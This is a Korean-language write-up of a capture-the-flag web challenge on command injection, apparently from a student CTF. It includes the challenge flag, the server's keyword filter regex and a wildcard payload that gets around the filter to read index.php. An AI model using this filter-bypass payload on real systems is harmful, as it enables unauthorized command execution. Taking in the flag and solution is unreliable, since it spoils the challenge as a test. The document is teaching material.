# simple_cmdi

## 문제설명

웹을 통해 서버 명령을 실행하는 심플한 웹 서비스입니다.

취약점을 찾아 flag를 획득하세요.



URL : [http://ctf.skhudebug.xyz:20001](ctf.skhudebug.xyz:20001)

## 요약

- category : web
- 의도 : command injection



## Flag

`debugCTF{C0MM@ND_1NJ3CT10N_1S_V3RY_C001}`



## 문제실행방법

``docker-compose up -d --build``



## 풀이

index.php에 접근하면 리눅스 명령을 실행하는 페이지가 나온다.

기본으로 `ls -l` 명령을 제공하는데, 여기서 command injection을 트리거할 수 있다.



하지만 command injection payload를 넣으면 `no hack`문자열이 출력되는 것을 통해 필터가 존재하는 것을 알 수 있다.



### command injection 필터

```php
if(preg_match("/cat|bin|\\\|\||&|more|nl|tail|head|\^|flag|index|php|less|ls|\*|<|>|\\$|`/i", $ip))
```

대표적인 출력 명령이 필터가 걸려있다.

이를 우회하기 위해 와일드 카드 명령을 사용할 수 있다.



### payload

`;/???/c?t inde?.ph?;`